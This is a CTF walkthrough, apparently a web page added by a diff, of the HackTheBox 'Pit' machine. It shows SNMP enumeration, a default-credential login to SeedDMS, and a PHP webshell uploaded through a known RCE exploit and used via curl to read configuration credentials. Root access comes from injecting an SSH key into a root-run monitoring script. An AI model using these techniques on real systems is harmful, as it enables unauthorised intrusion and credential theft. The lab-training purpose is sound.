@@ -1,0 +1,121 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">PIT HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/pit-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-12-31T12:01:41+00:00">December 31, 2021</time><time class="updated" datetime="2025-06-20T15:01:15+00:00">June 20, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Pit is a CTF Linux box with difficulty rated as a medium on Hack The Box platform. Let’s deep dive into breaking down this machine.</span></p>
+<h3><span style="color: #800000;"><strong>Pentesting Methodologies</strong></span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing HTTP services</span></li>
+<li><span style="color: #000000;">SNMP Enumeration</span></li>
+<li><span style="color: #000000;">Banner Grabbing</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Unrestricted file upload</span></li>
+<li><span style="color: #000000;">Post Enumeration</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing Writable Script</span></li>
+</ul>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Network Scanning</span> </strong></span></h3>
+<p><span style="color: #000000;">So let proceed with a nmap version scan and script scan. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -sC 10.129.95.189</pre>
+<p><span style="color: #000000;">From the output below we can find that 3 ports are opened:</span></p>
+<ul>
+<li><span style="color: #000000;">22 running ssh</span></li>
+<li><span style="color: #000000;">80 running http</span></li>
+<li><span style="color: #000000;">9090 running http</span></li>
+</ul>
+<p><span style="color: #000000;">We also find two additional information that is, a test page running on nginx port 80 and a domain certificate <strong>dms-pit.htb</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjkTUiKuk0YzfW3pzodUXf_ssI8x6A7nom3mXFoVLtiNmbzFPwlwA6WNvdwcELnI0TysxRWBfosClN4K7akoR7iIB8pzjA_hqDc1sbvOybs0i78Y56mXUNeV1gdwBvPiw3LvlISPGGrw6YQfKVTFY5iOvRHhfNgnCV7Gowew4f2kh75rD3N5wkfu1ZBJA=s16000"/></span></p>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Enumeration</span> </strong></span></h3>
+<p><span style="color: #000000;">So, let’s start enumeration the web ports 80 and 9090. When accessing the IP through port 80 via a browser, we are landing on the page below:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi7ZvJFcJA_HMNI8Zhxv4SdpybM8DPuLUQAB9mGwlR7RGeUnHBZYFb_f-MRB4GKO9d0a9AB_jm0FJkjoeZXsMC8I9x8p6c7PjD6kSuYfQunNPAyit6zfpp79Vk3o0IkxdgfUu2onSigqdBbhSrpoYqXfKrJzc9du6pXFPeY7Yf6it8EGxCY7JMlHHGi9A=s16000"/></span></p>
+<p><span style="color: #000000;">Whereas when we access the IP through port 9090 via a browser, we are landing on a different page as shown below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgxMHOnH1JJx86lSwaMSk_T-yHbI15x9_7Dh_4hl65Y3NLkr9ENKNMwmzoZVrasBDP3M90UuKiOFQuWwZcOKpYAhVuCekNU9RX7KSYBlf7Y94zQ5KuRqulpow0g1fty62sZKnspqQ3t6fskLysTHtAy6GYdS4up8t4B6NJyYryTwahvX6m0MCFrIvfGTw=s16000"/></span></p>
+<p><span style="color: #000000;">Since we don’t know the username and password, this is not very helpful at the moment. So let’s continue to enumerate. During the nmap scan, we also found another domain name, dms-pit.htb. let’s add this entry in our host file, /etc/hosts.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg4zEEEHLcaIgvkbFiP_kgoG_KwzcP7Lhl1Ec4Zh3rSPjrwRNpRUxqiIJarPpTvBi73uJDsIINmLCftajnb2GIFShmivJRe_E6MX2RFSPGiXQErYkoJSturezUP0SC4UhYYru4YuSoMSxmxIZxUt8VQL0FG0HraAGjtWskK-DPtl3vcAsnA0ANMNKYU5A=s16000"/></span></p>
+<p><span style="color: #000000;">Once we add the DNS entry into the host file, let’s access the DNS name in a browser to see what additional information we can have.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj8OKms_0IO7oz8VlBliZn-s4zr6RFjM0kA13MTny3wrs5LNX_TBCIQabxC0Xy54zhvXXfrRrvlMtZO1qLxiP7XkCjNAdCQdZV3z1mQQH6zxXWkKnO298eHHof5venGToSPdKRIWZI4TNJr6opa0jYjyUneHtjDnxb4uU-01rStXoM96DLaCahgN5zlow=s16000"/></span></p>
+<p><span style="color: #000000;">No luck. We go an error code 403 coming up. Maybe we will have more luck with a nmap UDP scan. So lets give it a try.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap –sU 10.129.95.189</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhz165fXQuHQdqisBryBFpnh7w6FHCgK7IhxXr2HQSVbYgq5dw3Bxd0bfff6Sg6jyg9pFB6-zdFa-JqZbN-VgtHVTM0xkAKZT_grEQfZr2wLCiqMSoO7W0hkzM0gNwAXlRcjB_cUNYjKLrel7SkwlBPbyIe2DTI4vuhwaa4yK0iT4kr9eyZvs3gEil1Yg=s16000"/></span></p>
+<p><span style="color: #000000;">The result shows that snmp port 161 is open on the target machine. SNMP is a protocol that is used to manage and monitor interconnected network devices. Let’s enumerate this protocol and see if we can get some valuable information.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sU -p161 -sV 10.129.95.189</pre>
+<p><span style="color: #000000;">we can see that the snmp version being used here is <strong>version 1</strong> and the community string used here is the default one, that is, <strong>public</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiQ154vBFsyV8vAS5e1m9vK8LG64cKavB_glXFRVhvLAaIS6WC2h13BsQsRrKN974k6ACyLmdCEOp3stVwj3a6NLvNzPpi0UvaK12F-1ngLC5Lhj_5YIJ_k3tUjusLjRumYmlCdjO9usbpdKAOMqdxGYIewE9sUVAnl8yXru8TVrGHCtavOukIkqSWrVQ=s16000"/></span></p>
+<p><span style="color: #000000;">Let’s enumerate deeper using the information found above.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">snmpwalk -v2c -c public 10.129.95.189 .</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhd7_PoPuyCvCjF3xZOsFxzNA6GUUFUOKHHFmwcfWQAY5-js5lUnSz70n1LlKc2SZ5rHjVJwKQqOCZ5Vpk_iERxxWgN86e_qWaTXWOpxDU5W8tb0DaBK-5txJhH37HuXHgFvGEh31O6rwULiPqxBYqTmsZB8B-jJ3FFePAD1mst4r5fJad6RUwMj9nEsg=s16000"/></span></p>
+<p><span style="color: #000000;">Two entries have strike our attention namely: <strong>/var/www/html/seeddmsSix/seeddms*</strong> and <strong>/usr/bin/monitor*</strong> . Maybe we can find more information at these location.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi4RrU_e6TdJ7BtBnhfml4tYzYWninOUZDITl6TpTke4dySHjLt46q2kdyLIFZc6J6C02j1PzqDdZtAvan-2jpMODITYDDpwBafoarAhb3nmzXaX-tKARBbbDyQWckJtPTet5pn4gLqZJ2Ws0Hp4nJbo8hNfU7SKXuVzwPM5ZZtcTBvviHfS67gUGr63Q=s16000"/></span></p>
+<p><span style="color: #000000;">Other useful information found is some usernames, <strong>michelle, root and system uptime</strong>. These can be used later.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi_QkKWXWrhtEMfX6yr3UuyKyOD0PAG0uw5DUSyMnV8pC4ZSGWjfpDvKv8IoJ3AGO5AamlVS-7hrxyjV0Kf1YWSfyz8PdlU4ixOpNtP0QW1-qGu0xIVEWI2uJceC3wazpxaAQjI6MDPvWW2PcYQZ31EKVCGO8YIij0I8ziLo0JLLtRO3r5_15zcUF1Uyw=w640-h328"/></span></p>
+<p><span style="color: #000000;">Now that we have collected a little information, let’s try to use that information. Let’s access the path that we found in the /html folder.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://dms-pit.htb/seeddmsSix/seeddms</pre>
+<p><span style="color: #000000;">we are automatically redirected to the login page below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgy8-N48Rh0FT7K8MonS4CrW3JC41-mWpGnDw2MPbDqO10R__8C88I01bm76hVYRpEzG7xrVp9gFXMw3ZJJzMBaX5XrjULbcDvydL8VzmkcOwYeRk04hia0YqnTtfTmj_uvZQqYtTntrBb0XCiL7bkqeSZCC95iXbp71dNbzT5UOpJS5w5RjX5LdXQ57Q=s16000"/></span></p>
+<p><span style="color: #000000;">Let’s try to login with some default username and password. The first one we try was michelle and michelle.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjuGbNYVR8g_9_uIP9g8XW8v9d5N7GQoMIo6_m2AjmFkc7MMzlHDCGulINUD9DUYz3Sudnbrj7CDVSTJH_4qZ2mkq9b6uLD-ppCejeY9Gl1J9ebP8N0sOAxX2sbzfWuxLwTcIumxczh7tTMZHSYxYUd37haMMSYVov6hIzLCggLjDSdZDX4UNNTLV1acA=s16000"/></span></p>
+<p><span style="color: #000000;">We have been able to login in with the username michelle and password michelle where we have enumerated the version for SeedDMS.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjfXSvwW7OYsmk0YsFpM7WE4UBaRETdehfG2U-XMiPVCoWaGA7-Pbfhnbj3V5p44ieRodbN5vdXJ3lLTt_0pXDlV51a8ep9qhbujuSJ_FwLhd8fMV_iDW2qUwOYo5WH9_F82Zf7AwnjmMIPqo396IgRPjyLvANPlPJmtZzkiljNM4xY9uS-7IoXB7NSsg=s16000"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">In the document information section, we can find valuable information like the name and version of the application. The application name is SeedDMS and it has just been upgraded to version 5.1.15. So let check if this application has some vulnerabilities which we can exploit.</span></p>
+<p><span style="color: #000000;">Using searchsploit, we found that this application is vulnerable to remote code execution. Let’s mirror the exploit locally.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit seeddms
+searchsploit –m 47022</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhYtR-Qym35-uEfW-kyfFrBAVxTENjBAl-pOtJn3GpTVy-VQwAgaDR7mSy_WKCKG7_kgqCBS14cFSBHUgA-EYVSa39PolOcGl6voltAcK4GFhw2YJn4Bs-WYobpvFzWnyALVAYTUwTz9hHKRMj22-rtAG1DqjBdTgFtBau1lHHoICkCyykqhKo7n5qcCA=s16000"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat 47022.txt</pre>
+<p><span style="color: #000000;">Once we have mirrored the exploit, we edit the file to check how this works. When we review the code, we conclude that executing this PHP backdoor while uploading the documents can obtain RCE.  </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgHjsy6qxBH5SuDe0j4BKp6GSnMmvcSU13xiK2sZnXdbhaVrROopOVXY_R8lGuApMRVZj7MBdXDn_-rxMcRjL1UsuF79Mzupc8xxcZz7BUubOuk8-L9eJ5mh9VIGSe-9-uYNn1ZikrYL_nQyS7Znvce11PZLcdZ7FnF9zZ-_61FqkGOq33Im98OLJn7nQ=s16000"/></span></p>
+<p><span style="color: #000000;">So, let’s browse to add document, in our case we will upload a simple PHP webshell, in our case its 1.php.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjkRRmDoVZNu0A9l1sJt9ILNN_J9w5KL7J1QCp8ycdkKHfy1wy3Ji9i3rT5JxJ-ROdIKJAvVFzb45RoVpW2JkaDEMtQzNT3kn1EcxdEuuWalYrlrqeHiHZbEWdCWhTOAFjRBP3Wyqhj0IK8cEpA1Ip8M9K8shKiUNXhBW-0xumjffb2IGxkP-3qaTQw4g=s16000"/></span></p>
+<p><span style="color: #000000;">Upload the 1.php and click on Add Document.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhE3hSAgfkn_B0mftR71Ok4QvH_yIW0i7Uu6ConK_do67t096GogWsp6u2SE4EwI6QSIw2uxyC3v97avvBqku27aQl5sJW4jQJcaIFVymXoSvP5nSc-j3OpFa7Rny_V9cApfY4oNMr-sfYoWxd0lfVZIEB4lmeQ7SM5mZ8fdEQ9Eix3g7Ba6hm1IP5aEg=s16000"/></span></p>
+<p><span style="color: #000000;">Once uploaded, we get a document id 35</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgMrGAzKL4h3UM_W3hUcq4BLzDNQ6kPjihInri6i4XJDBZbpHf400mRaH1bWjy0EoT8Mpg6fCURS6YTlMYAYvyrQDfn2vnIKhK256W9YZgvdyVbNJiI9rgxtmuAn3-B2CfmypY00CXq9iqBpmwq9GrjZEpvGgnw7M3771V9-ytUOUVsF7mgT9bWrEQJqw=s16000"/></span></p>
+<p><span style="color: #000000;">Now let’s use curl with parameter cmd-pwd to know which working directory the id 35 is located.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl http://dms-pit.htb/seeddms51x/data/1048576/35/1.php?cmd=pwd</pre>
+<p><span style="color: #000000;"> As you can see, it is located in <strong>/var/www/html/seeddms51x/data/1048576/35</strong> .</span></p>
+<p><span style="color: #000000;">Let’s continue to dig further to see what additional information we can have in the other directories. Inside the <strong>conf</strong> folder, there is a file called <strong>setting.xml</strong>, so let’s cat this file to see which configuration does it contain. Maybe we can find some resourceful details.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl http://dms-pit.htb/seeddms51x/data/1048576/35/1.php?cmd=ls+/var/www/html/seeddms51x
+curl http://dms-pit.htb/seeddms51x/data/1048576/35/1.php?cmd=ls++/var/www/html/seeddms51x/conf
+curl http://dms-pit.htb/seeddms51x/data/1048576/35/1.php?cmd=cat+/var/www/html/seeddms51x/conf/setting.xml</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiXaBCdknEI14tqb4i4bKbKjDlbTEAyzoyuwW4_pdoe6qVDWlDLzC6M1AUW4at2tMxEvon4RrNAYrrUYUOtmRSFUfbTFvFqxY54SG7xCc3yUqnVdT4RJViaWr2hUQs5UbXW4BjNeFfxQOBcMHsiJoijPQD--te6HcxJ5S6vYd9VWAIPXyBXC3YTGK9MgQ=s16000"/></span></p>
+<p><span style="color: #000000;">Indeed. Inside the setting file, we have the database connection setting, where we can clearly see some credentials details for establishing a connection.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiHrEQINmJ38rmDOhv9loOeBLGfxxP_5y9Gqdz9fLS_4inpuusZyLseKYWXFC_rWsHDNTE_lbIdh8JvHNSv8kI8DU3iLy0gn4wbJNzxbmj-yTplRfJiHI3i6U4RbgEmkVNDn_f_dhrte8tohODgvTBYS6KWT4W2dkx75ga1_iTA3Tw7JbyZRfHDMVDxpg=s16000"/></span></p>
+<p><span style="color: #000000;">And since the centos page is accessible on port 9090, lets try to login with username michelle and password found in the setting file. Great. We have been able to login successfully.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh92jFvnT5OmGkt42TPOJUAfuG9rAZ6ZeStnXkXaI8xX4TCI6M14rMH7XuEaPi3CCxqqwmTflfJJjNibBp-_mQXwQt5N-5bcYY42_eSRIUEK001BCkkDuQgDN2Y20Uh4ay1bopZB3C-UTGdwSF6VgPKU4OiTvaZWBCvrYK1wO4D-gL-ve1du3UR_MfBPQ=s16000"/></span></p>
+<p><span style="color: #000000;">While browsing the tabs on the left-hand side, we can see a terminal tab at the bottom. Clicking on that brings us to a terminal. And here while listing the files, we can find a user.txt file. At this stage, we have user-level access.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls
+cat user.txt</pre>
+<p><span style="color: #000000;">Now it’s time to perform a privilege escalation and to have root access. From the post enumeration results we found earlier, it seems that the scripts run files checksh which we found under /usr/local/monitoring.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj076z85Y_zcdJwlA7xYBgQ6wTLWpaaJ63dyJlnjuYqmrPArhJZ8PAC0Nwx_MwRhoJqI-1Ef0buOFEUPFAFsw8wMEe08C6VRkPUUyy952IRBmnVnCahVNHb4MxopbLzRGHwIdQEVYGcIQpyg4rfFf9vtWB7rSgmXkBXuRioSHZDFXyGQ--HR6CyEPHTOw=s16000"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">We will simply create a private key with ssh-keygen, then try transferring the private key inside the target machine to get root access shell</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjeQ-MMxSlEf2Sk74lfRlNB2kBVq57sQW0_vSLojhK5vdhggr7rBQUgpN6ITkjySk0Pwv2sDebY0qLWacgZgF2kvHm3S9xmVxP-khYL6h8aRZYkoajCNAWEk7iE0kcQk7NSwtexJV8urN7Oq0KNSzG3C0AX1YtgBk1toHUZgecjHLQXzM8pIpFDmJNcuw=s16000"/></span></p>
+<p><span style="color: #000000;">We try to upload our id_rsa.pub file into the compromised machine by editing checkshell.sh file to inject our private key inside /root/.ssh directory as authorized keys.</span></p>
+<p><span style="color: #000000;">Now let’s run the snmpwalk command which shall execute the script located in /usr/bin/monitor</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiKky_839A1Lknat0YFKQlMx5sXLV5CbqvReK1yXTgDgadSccyULX-idPuIATuKV_kaVO10-_o7uK1m__dW_VjfQjzk3vZL-7AW_jG9z2t-3UtGrN7HJSdWglLdypNulRtW4qsxEfU1Au0pcvX3FRva6pYRcEScxcPQq1Qr8ythSghsmfmN7q_juLz8nA=s16000"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">snmpwalk –v 1 -c public 10.129.95.189 1.3.6.1.4.1.8072.1.3.2</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj6FxXXstr-ZY7B9WnHTmGuwaCXTL0OkI0B1nGTuV5BbDiU2weaswPa9xFP7mglUjrN2tFl52fI6JMciMgigTAcgHWlp87j1XU8CpHeEeDvIfOsZD14L3pvSLSgDxrlSj7xLiPCn2dlqOkMq7w_LkHxadgeGyea03KIilLNaXikBJoKDh5NCd7iZJtnbg=s16000"/></span></p>
+<p><span style="color: #000000;">Once you execute the script, let’s login as root via ssh using the private key.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh –i id_rsa root@192.168.25.189
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgv-8kzDGxa2yKrgTcDjMDdo3vBFTbcwMFwhaIjwr-KyDdK_iR3gPWy_D96GPE8kpEz9DlCZBc1Sfw468d-N2Yt-gto8o2suRZ8ewsWg97MZDhgFtks-c-lLS81Mv22whs-MFPtFScVVyzFhgGTeQSKbU1okGZtE5c4tmgG_SofwS3bxFgszJcNtBV8iA=s16000"/></span></p>
+<p><span style="color: #000000;">Finally, we have root access and capture the flags.</span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Tirut Hawoldar is a Cyber Security Enthusiast and CTF player with 15 years of experience in IT Security and Infrastructure. Contact on <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/tirut-hawoldar-72b67214/"><strong>LinkedIn</strong></a></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
